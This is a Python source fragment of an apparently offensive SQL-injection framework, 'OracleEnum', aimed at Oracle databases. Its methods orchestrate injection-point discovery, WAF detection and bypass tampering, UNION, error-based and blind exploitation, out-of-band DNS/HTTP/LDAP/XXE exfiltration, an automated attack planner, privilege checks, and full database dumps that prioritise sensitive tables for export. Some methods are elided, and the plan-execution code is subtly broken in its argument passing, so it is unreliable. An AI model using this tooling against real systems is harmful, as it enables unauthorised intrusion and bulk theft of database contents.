        self.logger.info(f"[OracleEnum] Indicators: {result.indicators}")
        self.logger.info(f"[OracleEnum] Result: {result.get_summary()}")

        if result.attack_plan_result and result.attack_plan_result.success:
            self.logger.info(
                f"[OracleEnum] Attack Plan: {result.attack_plan_result.get_summary()}"
            )

        if result.oob_result and result.oob_result.success:
            self.logger.info(f"[OracleEnum] OOB: {result.oob_result.get_summary()}")

        if result.blind_extract_result and result.blind_extract_result.success:
            self.logger.info(
                f"[OracleEnum] Blind Extract: {result.blind_extract_result.get_summary()}"
            )

        if result.dump_result and result.dump_result.success:
            self.logger.info(f"[OracleEnum] Dump: {result.dump_result.get_summary()}")
        if result.union_result and result.union_result.success:
            self.logger.info(f"[OracleEnum] UNION: {result.union_result.get_summary()}")
        if result.tamper_result and result.tamper_result.success:
            self.logger.info(
                f"[OracleEnum] Tamper: {result.tamper_result.get_summary()}"
            )
        if result.waf_result and result.waf_result.success:
            self.logger.info(f"[OracleEnum] WAF: {result.waf_result.get_summary()}")
        if result.error_based_result and result.error_based_result.success:
            self.logger.info(
                f"[OracleEnum] Error Based: {result.error_based_result.get_summary()}"
            )
        if result.time_blind_result and result.time_blind_result.success:
            self.logger.info(
                f"[OracleEnum] Time Blind: {result.time_blind_result.get_summary()}"
            )
        if result.blind_boolean_result and result.blind_boolean_result.success:
            self.logger.info(
                f"[OracleEnum] Blind Boolean: {result.blind_boolean_result.get_summary()}"
            )
        if result.datatype_detection and result.datatype_detection.success:
            self.logger.info(
                f"[OracleEnum] Data Types: {result.datatype_detection.get_summary()}"
            )
        if result.column_detection and result.column_detection.success:
            self.logger.info(
                f"[OracleEnum] Columns: {result.column_detection.get_summary()}"
            )
        if result.injection_discovery and result.injection_discovery.success:
            self.logger.info(
                f"[OracleEnum] Injection Points: {result.injection_discovery.get_summary()}"
            )
        if result.sqli_result and result.sqli_result.success:
            self.logger.info(f"[OracleEnum] SQLi: {result.sqli_result.get_summary()}")
        if result.version_result:
            self.logger.info(
                f"[OracleEnum] Version: {result.version_result.get_summary()}"
            )
        if result.database_results and result.database_results.success:
            self.logger.info(
                f"[OracleEnum] Database: {result.database_results.get_summary()}"
            )
        if result.schema_result:
            self.logger.info(
                f"[OracleEnum] Schema: {result.schema_result.get_summary()}"
            )
        if result.privilege_results and result.privilege_results.success:
            self.logger.info(
                f"[OracleEnum] Privileges: {result.privilege_results.get_summary()}"
            )
        if result.extraction_results:
            total_rows = sum(r.row_count for r in self.extraction_results.values())
            self.logger.info(
                f"[OracleEnum] Extraction: {total_rows} rows from {len(self.extraction_results)} tables"
            )
        self.logger.info(
            "[OracleEnum] =================================================="
        )

        self.detection_result = result
        return result

    # ============================================================
    # Phase 20: AI Attack Planning & Orchestration Methods
    # ============================================================

    def _ensure_attack_planner(self) -> AttackPlanner:
        """Ensure attack planner is initialized."""
        if self.attack_planner is None:
            self.logger.info("[OracleEnum] Initializing attack planner...")
            self.attack_planner = AttackPlanner(
                logger=self.logger,
                tamper_engine=self.tamper_engine,
                confidence_threshold=70.0,
                max_estimated_requests=10000,
            )
            self.logger.info("[OracleEnum] Attack planner initialized successfully")
        return self.attack_planner

    def plan_attack(self, *args, **kwargs):
        """Plan an attack using the attack planner."""
        return self._plan_attack_impl(*args, **kwargs)

    def _plan_attack_impl(self, injection_point: str, **kwargs) -> AttackPlanResult:
        """Implementation of attack planning."""
        planner = self._ensure_attack_planner()
        return planner.plan_attack(injection_point, **kwargs)

    def _execute_strategy(
        self, strategy: ExploitationStrategy, injection_point: str, **kwargs
    ) -> dict[str, Any]:
        """Execute a specific exploitation strategy."""
        result = {"success": False, "data": None, "error": None}

        try:
            self.logger.info(f"[OracleEnum] Executing strategy: {strategy.value}")

            if strategy == ExploitationStrategy.UNION:
                waf_name = None
                if self.detection_result and self.detection_result.waf_result:
                    waf_name = self.detection_result.waf_result.waf_name

                union_result = self.union_exploiter.exploit(
                    injection_point, waf_name=waf_name
                )
                if union_result.success:
                    result["success"] = True
                    result["data"] = union_result.extracted_data
                else:
                    result["error"] = (
                        union_result.errors[0]
                        if union_result.errors
                        else "UNION exploitation failed"
                    )

            elif strategy == ExploitationStrategy.ERROR_BASED:
                error_result = self.error_based_engine.detect_error_based(
                    injection_point
                )
                if error_result.is_vulnerable:
                    result["success"] = True
                    result["data"] = error_result.extracted_values
                else:
                    result["error"] = "Error-Based exploitation not available"

            elif strategy == ExploitationStrategy.BOOLEAN_BLIND:
                if self.blind_extractor:
                    blind_result = self.blind_extractor.extract_all(
                        injection_point, technique=ExtractionTechnique.BOOLEAN
                    )
                    if blind_result.success:
                        result["success"] = True
                        result["data"] = blind_result.extracted_value
                    else:
                        result["error"] = (
                            blind_result.errors[0]
                            if blind_result.errors
                            else "Boolean Blind extraction failed"
                        )
                else:
                    result["error"] = "Boolean Blind extractor not initialized"

            elif strategy == ExploitationStrategy.TIME_BLIND:
                if self.blind_extractor:
                    blind_result = self.blind_extractor.extract_all(
                        injection_point, technique=ExtractionTechnique.TIME
                    )
                    if blind_result.success:
                        result["success"] = True
                        result["data"] = blind_result.extracted_value
                    else:
                        result["error"] = (
                            blind_result.errors[0]
                            if blind_result.errors
                            else "Time Blind extraction failed"
                        )
                else:
                    result["error"] = "Time Blind extractor not initialized"

            elif strategy in [
                ExploitationStrategy.OOB_DNS,
                ExploitationStrategy.OOB_HTTP,
            ]:
                if self.oob_exploiter:
                    query = kwargs.get("query", "SELECT USER FROM dual")
                    oob_result = self.oob_exploiter.exploit(
                        query=query, auto_detect=True
                    )
                    if oob_result.success:
                        result["success"] = True
                        result["data"] = oob_result.extracted_data
                    else:
                        result["error"] = (
                            oob_result.errors[0]
                            if oob_result.errors
                            else "OOB exploitation failed"
                        )
                else:
                    result["error"] = "OOB exploiter not initialized"

            else:
                result["error"] = f"Strategy {strategy.value} not implemented"

        except (ValueError, TypeError, AttributeError, RuntimeError) as e:
            result["error"] = str(e)
            self.logger.error(f"[OracleEnum] Strategy {strategy.value} failed: {e}")

        return result

    def execute_plan(self, plan_result: AttackPlanResult, **kwargs) -> dict[str, Any]:
        """Execute an attack plan."""
        if not plan_result.success:
            return {"success": False, "error": "Plan is not valid"}

        results = {}
        for step in plan_result.execution_plan:
            strategy = step.get("strategy")
            if strategy:
                step_result = self._execute_strategy(strategy, **kwargs)
                results[strategy] = step_result

        return results

    def auto_exploit(
        self, injection_point: str, query: str | None = None, **kwargs
    ) -> dict[str, Any]:
        """Fully automatic exploitation - plan and execute."""
        self.logger.info("[OracleEnum] Starting automatic exploitation...")
        self.logger.info(f"[OracleEnum] Injection point: {injection_point}")

        plan = self.plan_attack(injection_point, **kwargs)

        if not plan.success:
            return {
                "success": False,
                "error": "No viable exploitation strategy found",
                "plan": plan.to_dict(),
                "reasoning": plan.reasoning,
            }

        results = self.execute_plan(plan, injection_point, query=query, **kwargs)
        results["plan"] = plan.to_dict()

        if results.get("success"):
            self.logger.info(
                f"[OracleEnum] Auto-exploitation successful! Strategy: {results.get('strategy_used')}"
            )
        else:
            self.logger.warning(
                f"[OracleEnum] Auto-exploitation failed: {results.get('error', 'Unknown error')}"
            )

        return results

    def get_attack_plan_summary(self) -> str | None:
        """Get a summary of the current attack plan."""
        if self.detection_result and self.detection_result.attack_plan_result:
            return self.detection_result.attack_plan_result.get_summary()
        return None

    def get_available_strategies(self) -> list[str]:
        """Get all available exploitation strategies."""
        planner = self._ensure_attack_planner()
        return [s.value for s in planner.get_available_strategies()]

    def validate_attack_plan(self) -> bool:
        """Validate the current attack plan."""
        if self.detection_result and self.detection_result.attack_plan_result:
            planner = self._ensure_attack_planner()
            return planner.validate_plan(self.detection_result.attack_plan_result)
        return False

    # ============================================================
    # Phase 18: Blind Extractor Methods
    # ============================================================

    def _ensure_blind_extractor(self, injection_point: str) -> BlindExtractor:
        """Ensure blind extractor is initialized with proper configuration."""
        if self.blind_extractor is None:
            self.logger.info("[OracleEnum] Initializing blind extractor...")
            self.blind_extractor = BlindExtractor(
                session=self.session,
                base_url=self.base_url,
                logger=self.logger,
                injection_point=injection_point,
                use_boolean=(
                    self.detection_result.blind_boolean_result.is_vulnerable
                    if self.detection_result
                    and self.detection_result.blind_boolean_result
                    else True
                ),
                use_time=(
                    self.detection_result.time_blind_result.is_vulnerable
                    if self.detection_result and self.detection_result.time_blind_result
                    else True
                ),
            )

            self.logger.info("[OracleEnum] Blind extractor initialized successfully")
        return self.blind_extractor

    def extract_blind_all(
        self,
        injection_point: str,
        target_type: str = "all",
        target_name: str | None = None,
        max_items: int = 1000,
        auto_detect_technique: bool = True,
        technique: ExtractionTechnique | None = None,
    ) -> BlindExtractionResult:
        """Perform complete blind extraction."""
        self.logger.info("[OracleEnum] Starting blind extraction...")
        self.logger.info(f"[OracleEnum] Target type: {target_type}")
        self.logger.info(f"[OracleEnum] Target name: {target_name}")
        self.logger.info(f"[OracleEnum] Max items: {max_items}")

        try:
            extractor = self._ensure_blind_extractor(injection_point)

            if auto_detect_technique and technique is None:
                technique = extractor._detect_best_technique()
                if technique:
                    self.logger.info(
                        f"[OracleEnum] Auto-detected technique: {technique.value}"
                    )
                else:
                    self.logger.warning(
                        "[OracleEnum] No technique detected, using boolean"
                    )
                    technique = ExtractionTechnique.BOOLEAN

            result = extractor.extract_all(
                injection_point=injection_point,
                technique=technique,
                target_type=target_type,
                target_name=target_name,
                max_items=max_items,
            )

            if self.detection_result:
                self.detection_result.blind_extract_result = result

            return result

        except (ValueError, TypeError, AttributeError, RuntimeError) as e:
            self.logger.error(f"[OracleEnum] Blind extraction failed: {e!s}")
            return BlindExtractionResult(
                success=False,
                errors=[str(e)],
                status=ExtractionStatus.FAILED,
            )

    # ... (remaining methods unchanged) ...
    # The rest of the methods (extract_blind_string, extract_blind_database, etc.)
    # remain the same as in the original file

    # ============================================================
    # Phase 19: Out-of-Band (OOB) Exploitation Methods
    # ============================================================

    def _ensure_oob_exploiter(self, injection_point: str) -> OutOfBandExploiter:
        """Ensure OOB exploiter is initialized."""
        if self.oob_exploiter is None:
            self.logger.info("[OracleEnum] Initializing OOB exploiter...")
            self.oob_exploiter = OutOfBandExploiter(
                session=self.session,
                base_url=self.base_url,
                injection_point=injection_point,
                logger=self.logger,
                enable_dns=True,
                enable_http=True,
                enable_ldap=True,
                enable_xxe=True,
            )
            self.logger.info("[OracleEnum] OOB exploiter initialized successfully")
        return self.oob_exploiter

    # ... (remaining methods unchanged) ...

    # ============================================================
    # Original Methods (unchanged)
    # ============================================================

    def is_oracle(
        self,
        injection_point: str,
        detect_waf: bool = False,
        detect_sqli: bool = False,
        discover_parameters: bool = False,
        detect_columns: bool = False,
        detect_datatypes: bool = False,
        detect_blind_boolean: bool = False,
        detect_time_blind: bool = False,
        detect_error_based: bool = False,
        exploit_union: bool = False,
        fingerprint_version: bool = False,
        enumerate_database: bool = False,
        enumerate_schema: bool = False,
        enumerate_privileges: bool = False,
        extract_data: bool = False,
    ) -> bool:
        """Simple boolean check if the backend is Oracle."""
        result = self.detect(
            injection_point,
            detect_waf,
            detect_sqli,
            discover_parameters,
            detect_columns,
            detect_datatypes,
            detect_blind_boolean,
            detect_time_blind,
            detect_error_based,
            exploit_union,
            fingerprint_version,
            enumerate_database,
            enumerate_schema,
            enumerate_privileges,
            extract_data,
        )
        return result.is_oracle

    def get_detection_score(self, injection_point: str) -> int:
        """Get the detection score without performing full detection."""
        if self.detection_result is None:
            self.detect(injection_point)
        return self.detection_result.score if self.detection_result else 0

    # ============================================================
    # Phase 2: Version Methods
    # ============================================================

    def get_oracle_version(self, injection_point: str) -> str | None:
        """Get Oracle version."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get version - Oracle not detected")
            return None
        return self.version_fingerprinter.get_version(injection_point)

    def get_oracle_edition(self, injection_point: str) -> str | None:
        """Get Oracle edition."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get edition - Oracle not detected")
            return None
        return self.version_fingerprinter.get_edition(injection_point)

    def is_oracle_xe(self, injection_point: str) -> bool:
        """Check if Oracle is Express Edition."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot check XE - Oracle not detected")
            return False
        return self.version_fingerprinter.is_xe(injection_point)

    # ============================================================
    # Phase 3: Schema Methods
    # ============================================================

    def get_schema_information(self, injection_point: str) -> OracleSchemaResult:
        """Get complete schema information."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get schema - Oracle not detected")
            result = OracleSchemaResult()
            result.add_error("Oracle not detected")
            return result
        return self.schema_enumerator.enumerate_all(injection_point)

    def get_database_information(self, injection_point: str) -> dict[str, Any]:
        """Get basic database information only."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get database info - Oracle not detected"
            )
            return {"error": "Oracle not detected"}
        return self.schema_enumerator.get_database_info(injection_point)

    def get_current_user(self, injection_point: str) -> str | None:
        """Get current database user."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get user - Oracle not detected")
            return None
        return self.schema_enumerator.get_current_user(injection_point)

    # ============================================================
    # Phase 4: Data Extraction Methods
    # ============================================================

    def extract_table_data(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
        max_rows: int | None = None,
    ) -> OracleExtractionResult:
        """Extract data from a specific table."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot extract data - Oracle not detected"
            )
            result = OracleExtractionResult()
            result.add_error("Oracle not detected")
            return result
        return self.data_extractor.extract_table(
            injection_point, schema, table, columns, max_rows
        )

    def extract_rows(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: list[str] | None = None,
        limit: int | None = None,
        offset: int | None = 0,
    ) -> OracleExtractionResult:
        """Extract rows with pagination."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot extract rows - Oracle not detected"
            )
            result = OracleExtractionResult()
            result.add_error("Oracle not detected")
            return result
        return self.data_extractor.extract_rows(
            injection_point, schema, table, columns, limit, offset
        )

    def get_table_row_count(self, injection_point: str, schema: str, table: str) -> int:
        """Get row count for a table."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get row count - Oracle not detected"
            )
            return -1
        return self.data_extractor.count_rows(injection_point, schema, table)

    # ============================================================
    # Phase 5: Privilege Methods
    # ============================================================

    def get_privilege_information(self, injection_point: str) -> OraclePrivilegeResult:
        """Get complete privilege information."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get privileges - Oracle not detected"
            )
            result = OraclePrivilegeResult()
            result.add_error("Oracle not detected")
            return result
        return self.privilege_enumerator.enumerate_all(injection_point)

    def get_current_privileged_user(self, injection_point: str) -> str | None:
        """Get current database user (privilege context)."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get user - Oracle not detected")
            return None
        return self.privilege_enumerator.get_current_user(injection_point)

    def check_dba_status(self, injection_point: str) -> bool:
        """Check if current user has DBA privileges."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot check DBA - Oracle not detected")
            return False
        return self.privilege_enumerator.is_dba(injection_point)

    # ============================================================
    # Phase 6: Database Methods
    # ============================================================

    def get_database_environment(self, injection_point: str) -> OracleDatabaseResult:
        """Get complete database environment information."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get database environment - Oracle not detected"
            )
            result = OracleDatabaseResult()
            result.add_error("Oracle not detected")
            return result
        return self.database_enumerator.enumerate_all(injection_point)

    def get_database_version_info(self, injection_point: str) -> str | None:
        """Get database version only."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get database version - Oracle not detected"
            )
            return None
        return self.database_enumerator.get_version(injection_point)

    def get_instance_name_info(self, injection_point: str) -> str | None:
        """Get instance name only."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get instance name - Oracle not detected"
            )
            return None
        return self.database_enumerator.get_instance(injection_point)

    # ============================================================
    # Phase 7: SQL Injection Methods
    # ============================================================

    def detect_sqli(
        self, injection_point: str, fast_mode: bool = False
    ) -> SQLiDetectionResult:
        """Detect SQL injection vulnerability."""
        self.logger.info("[OracleEnum] Running SQL injection detection...")
        return self.sqli_detector.detect(injection_point, fast_mode)

    def is_sqli_vulnerable(self, injection_point: str) -> bool:
        """Quick check if parameter is vulnerable to SQL injection."""
        self.logger.info("[OracleEnum] Checking SQL injection vulnerability...")
        return self.sqli_detector.is_vulnerable(injection_point)

    def get_sqli_payload(self, injection_point: str) -> str | None:
        """Get working SQL injection payload."""
        self.logger.info("[OracleEnum] Getting SQL injection payload...")
        return self.sqli_detector.get_payload(injection_point)

    def get_sqli_confidence(self, injection_point: str) -> int:
        """Get SQL injection confidence score."""
        self.logger.info("[OracleEnum] Getting SQL injection confidence...")
        return self.sqli_detector.get_confidence(injection_point)

    # ============================================================
    # Phase 8: Injection Point Methods
    # ============================================================

    def discover_injection_points(
        self,
        url: str,
        data: str | dict | None = None,
        json_data: str | dict | None = None,
        xml_data: str | None = None,
        cookies: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        test_parameters: bool = True,
    ) -> InjectionDiscoveryResult:
        """Discover all injection points in a request."""
        self.logger.info("[OracleEnum] Discovering injection points...")
        return self.injection_discovery.discover_all(
            url, data, json_data, xml_data, cookies, headers, test_parameters
        )

    def get_injection_points(self) -> list[dict[str, Any]]:
        """Get all discovered injection points as dictionaries."""
        if self.detection_result and self.detection_result.injection_discovery:
            return [
                p.to_dict()
                for p in self.detection_result.injection_discovery.parameters
            ]
        return []

    def get_best_injection_point(self) -> dict[str, Any] | None:
        """Get the best injection point."""
        if self.detection_result and self.detection_result.injection_discovery:
            best = self.detection_result.injection_discovery.get_best_parameter()
            return best.to_dict() if best else None
        return None

    def get_injectable_parameters(self) -> list[dict[str, Any]]:
        """Get all injectable parameters."""
        if self.detection_result and self.detection_result.injection_discovery:
            injectable = (
                self.detection_result.injection_discovery.get_injectable_parameters()
            )
            return [p.to_dict() for p in injectable]
        return []

    # ============================================================
    # Phase 9: Column Detection Methods
    # ============================================================

    def detect_columns(
        self, injection_point: str, max_columns: int = 30
    ) -> ColumnDetectionResult:
        """Detect column count and reflective columns."""
        self.logger.info("[OracleEnum] Detecting columns...")
        return self.column_detector.detect_column_count(injection_point, max_columns)

    def get_column_count(self, injection_point: str) -> int:
        """Get the number of columns."""
        if self.detection_result and self.detection_result.column_detection:
            return self.detection_result.column_detection.column_count
        result = self.column_detector.detect_column_count(injection_point)
        return result.column_count if result.success else 0

    def get_reflective_columns(self, injection_point: str) -> list[int]:
        """Get reflective column indices."""
        if self.detection_result and self.detection_result.column_detection:
            return self.detection_result.column_detection.reflective_columns
        result = self.column_detector.detect_column_count(injection_point)
        return result.reflective_columns if result.success else []

    def get_union_payload(self, injection_point: str) -> str | None:
        """Get the best UNION payload."""
        return self.column_detector.get_best_union_payload(injection_point)

    # ============================================================
    # Phase 10: Data Type Detection Methods
    # ============================================================

    def detect_datatypes(
        self, injection_point: str, column_count: int | None = None
    ) -> DataTypeDetectionResult:
        """Detect data types for all columns."""
        self.logger.info("[OracleEnum] Detecting data types...")
        return self.datatype_detector.detect_column_types(injection_point, column_count)

    def get_best_union_payload_dt(
        self, injection_point: str, column_count: int | None = None
    ) -> str | None:
        """Get the best UNION payload from data type detection."""
        return self.datatype_detector.get_best_union_payload(
            injection_point, column_count
        )

    def get_reflective_column_dt(
        self, injection_point: str, column_count: int | None = None
    ) -> int | None:
        """Get the best reflective column from data type detection."""
        return self.datatype_detector.get_reflective_column(
            injection_point, column_count
        )

    def verify_union_payload(self, injection_point: str, payload: str) -> bool:
        """Verify a UNION payload works."""
        return self.datatype_detector.verify_payload(injection_point, payload)

    # ============================================================
    # Phase 11: Blind Boolean Methods
    # ============================================================

    def detect_blind_boolean(self, injection_point: str) -> BlindBooleanResult:
        """Detect boolean-based blind SQL injection."""
        self.logger.info("[OracleEnum] Detecting boolean blind SQL injection...")
        return self.blind_boolean_engine.detect_boolean_blind(injection_point)

    def is_boolean_vulnerable(self, injection_point: str) -> bool:
        """Check if parameter is vulnerable to boolean blind injection."""
        self.logger.info("[OracleEnum] Checking boolean blind vulnerability...")
        return self.blind_boolean_engine.is_boolean_vulnerable(injection_point)

    def get_best_boolean_payload(self, injection_point: str) -> str | None:
        """Get the best boolean payload."""
        self.logger.info("[OracleEnum] Getting best boolean payload...")
        return self.blind_boolean_engine.get_best_boolean_payload(injection_point)

    def compare_boolean_payloads(
        self, injection_point: str, true_payload: str, false_payload: str
    ) -> dict[str, Any]:
        """Compare true and false boolean payloads."""
        self.logger.info("[OracleEnum] Comparing boolean payloads...")
        return self.blind_boolean_engine.compare_true_false(
            injection_point, true_payload, false_payload
        )

    # ============================================================
    # Phase 12: Time Blind Methods
    # ============================================================

    def detect_time_blind(
        self, injection_point: str, delays: list[int] | None = None
    ) -> TimeBlindResult:
        """Detect time-based blind SQL injection."""
        self.logger.info("[OracleEnum] Detecting time blind SQL injection...")
        return self.time_blind_engine.detect_time_blind(injection_point, delays)

    def is_time_based_vulnerable(self, injection_point: str) -> bool:
        """Check if parameter is vulnerable to time-based injection."""
        self.logger.info("[OracleEnum] Checking time-based vulnerability...")
        return self.time_blind_engine.is_time_based_vulnerable(injection_point)

    def get_best_time_payload(self, injection_point: str) -> str | None:
        """Get the best time-based payload."""
        self.logger.info("[OracleEnum] Getting best time payload...")
        return self.time_blind_engine.get_best_time_payload(injection_point)

    def measure_response_time(
        self,
        injection_point: str,
        payload: str | None = None,
        num_measurements: int = 3,
    ) -> float:
        """Measure response time for a payload."""
        self.logger.info("[OracleEnum] Measuring response time...")
        avg, _ = self.time_blind_engine._measure_response_time(
            injection_point, payload, num_measurements
        )
        return avg

    # ============================================================
    # Phase 13: Error Based Methods
    # ============================================================

    def detect_error_based(self, injection_point: str) -> ErrorBasedResult:
        """Detect error-based SQL injection."""
        self.logger.info("[OracleEnum] Detecting error-based SQL injection...")
        return self.error_based_engine.detect_error_based(injection_point)

    def is_error_based(self, injection_point: str) -> bool:
        """Check if parameter is vulnerable to error-based injection."""
        self.logger.info("[OracleEnum] Checking error-based vulnerability...")
        return self.error_based_engine.is_error_based(injection_point)

    def get_best_error_payload(self, injection_point: str) -> str | None:
        """Get the best error-based payload."""
        self.logger.info("[OracleEnum] Getting best error payload...")
        return self.error_based_engine.get_best_error_payload(injection_point)

    def extract_error_data(self, injection_point: str, payload: str) -> list[str]:
        """Extract data from error message using a payload."""
        self.logger.info("[OracleEnum] Extracting error data...")
        return self.error_based_engine.extract_error_data(injection_point, payload)

    # ============================================================
    # Phase 14: WAF Methods
    # ============================================================

    def detect_waf(self, injection_point: str | None = None) -> WAFDetectionResult:
        """Detect and fingerprint WAF."""
        self.logger.info("[OracleEnum] Detecting WAF...")
        return self.waf_detector.detect(injection_point)

    def is_waf_present(self, injection_point: str | None = None) -> bool:
        """Check if WAF is present."""
        self.logger.info("[OracleEnum] Checking WAF presence...")
        return self.waf_detector.is_waf_present(injection_point)

    def get_waf_name(self, injection_point: str | None = None) -> str | None:
        """Get detected WAF name."""
        self.logger.info("[OracleEnum] Getting WAF name...")
        return self.waf_detector.get_waf_name(injection_point)

    def get_waf_bypass_recommendations(
        self, injection_point: str | None = None
    ) -> list[str]:
        """Get WAF bypass recommendations."""
        self.logger.info("[OracleEnum] Getting WAF bypass recommendations...")
        return self.waf_detector.get_bypass_recommendations(injection_point)

    # ============================================================
    # Phase 15: Tamper Methods
    # ============================================================

    def apply_tamper(self, payload: str, tamper_name: str) -> TamperResult:
        """Apply a single tamper to a payload."""
        self.logger.info(f"[OracleEnum] Applying tamper: {tamper_name}")
        return self.tamper_engine.apply(payload, tamper_name)

    def apply_tamper_chain(self, payload: str, tamper_chain: list[str]) -> TamperResult:
        """Apply multiple tampers in sequence."""
        self.logger.info(f"[OracleEnum] Applying tamper chain: {tamper_chain}")
        return self.tamper_engine.apply_chain(payload, tamper_chain)

    def recommend_tampers(self, waf_name: str) -> list[str]:
        """Recommend tampers for a specific WAF."""
        self.logger.info(f"[OracleEnum] Getting tamper recommendations for: {waf_name}")
        return self.tamper_engine.recommend_tampers(waf_name)

    def list_tampers(self) -> list[str]:
        """List all available tamper methods."""
        self.logger.info("[OracleEnum] Listing available tampers")
        return self.tamper_engine.list_tampers()

    def get_tamper_confidence(self, tamper_name: str) -> int:
        """Get confidence score for a tamper."""
        self.logger.info(f"[OracleEnum] Getting tamper confidence: {tamper_name}")
        return self.tamper_engine.get_tamper_confidence(tamper_name)

    def test_tamper(self, payload: str, tamper_name: str) -> bool:
        """Test if a tamper modifies the payload."""
        self.logger.info(f"[OracleEnum] Testing tamper: {tamper_name}")
        return self.tamper_engine.test_tamper(payload, tamper_name)

    # ============================================================
    # Phase 16: UNION Exploit Methods
    # ============================================================

    def exploit_union(
        self, injection_point: str, waf_name: str | None = None
    ) -> UnionExploitResult:
        """Perform UNION-based SQL injection exploitation."""
        self.logger.info("[OracleEnum] Starting UNION exploitation...")
        return self.union_exploiter.exploit(injection_point, waf_name)

    def find_working_payload(
        self, injection_point: str, waf_name: str | None = None
    ) -> str | None:
        """Find a working UNION payload."""
        self.logger.info("[OracleEnum] Finding working payload...")
        return self.union_exploiter.find_best_payload(injection_point, waf_name)

    def get_best_union_payload(self) -> str | None:
        """Get the best working UNION payload."""
        self.logger.info("[OracleEnum] Getting best UNION payload...")
        return self.union_exploiter.get_best_payload()

    def get_union_column_count(self) -> int:
        """Get the detected column count."""
        return self.union_exploiter.column_count

    # ============================================================
    # Phase 17: Database Dumper Methods
    # ============================================================

    def _ensure_dumper(self, injection_point: str) -> OracleDatabaseDumper:
        """Ensure database dumper is initialized."""
        if self.database_dumper is None:
            self.database_dumper = OracleDatabaseDumper(
                self.session, self.base_url, injection_point, self.logger
            )
        return self.database_dumper

    def dump_database(
        self,
        injection_point: str,
        max_schemas: int = 20,
        max_tables: int = 50,
        max_rows: int | None = None,
        blacklist: set[str] | None = None,
        whitelist: set[str] | None = None,
        prioritize_sensitive: bool = True,
        resume: bool = False,
    ) -> DatabaseDumpResult:
        """Dump the entire database."""
        self.logger.info("[OracleEnum] Starting database dump...")
        dumper = self._ensure_dumper(injection_point)
        result = dumper.dump_database(
            max_schemas=max_schemas,
            max_tables=max_tables,
            max_rows=max_rows,
            blacklist=blacklist,
            whitelist=whitelist,
            prioritize_sensitive=prioritize_sensitive,
            resume=resume,
        )
        if self.detection_result:
            self.detection_result.dump_result = result
        return result

    def dump_table(
        self,
        injection_point: str,
        schema: str,
        table: str,
        max_rows: int | None = None,
    ) -> list[dict[str, Any]]:
        """Dump a single table."""
        self.logger.info(f"[OracleEnum] Dumping table: {schema}.{table}")
        dumper = self._ensure_dumper(injection_point)
        return dumper.dump_table(schema, table, max_rows)

    def dump_schema(
        self,
        injection_point: str,
        schema: str,
        tables: list[str] | None = None,
        max_rows: int | None = None,
    ) -> dict[str, list[dict[str, Any]]]:
        """Dump all tables in a schema."""
        self.logger.info(f"[OracleEnum] Dumping schema: {schema}")
        dumper = self._ensure_dumper(injection_point)
        return dumper.dump_schema(schema, tables, max_rows)

    def export_dump_json(self, injection_point: str, output_path: str) -> str:
        """Export dump to JSON."""
        dumper = self._ensure_dumper(injection_point)
        if dumper.dump_result is None:
            self.logger.warning("[OracleEnum] No dump result to export")
            return ""
        return dumper.export_json(dumper.dump_result, output_path)

    def export_dump_csv(self, injection_point: str, output_dir: str) -> list[str]:
        """Export dump to CSV files."""
        dumper = self._ensure_dumper(injection_point)
        if dumper.dump_result is None:
            self.logger.warning("[OracleEnum] No dump result to export")
            return []
        return dumper.export_csv(dumper.dump_result, output_dir)

    def export_dump_sqlite(self, injection_point: str, output_path: str) -> str:
        """Export dump to SQLite database."""
        dumper = self._ensure_dumper(injection_point)
        if dumper.dump_result is None:
            self.logger.warning("[OracleEnum] No dump result to export")
            return ""
        return dumper.export_sqlite(dumper.dump_result, output_path)

    def export_dump_markdown(self, injection_point: str, output_path: str) -> str:
        """Export dump to Markdown."""
        dumper = self._ensure_dumper(injection_point)
        if dumper.dump_result is None:
            self.logger.warning("[OracleEnum] No dump result to export")
            return ""
        return dumper.export_markdown(dumper.dump_result, output_path)

    def get_dump_progress(self, injection_point: str) -> dict[str, Any]:
        """Get current dump progress."""
        dumper = self._ensure_dumper(injection_point)
        return dumper.track_progress()
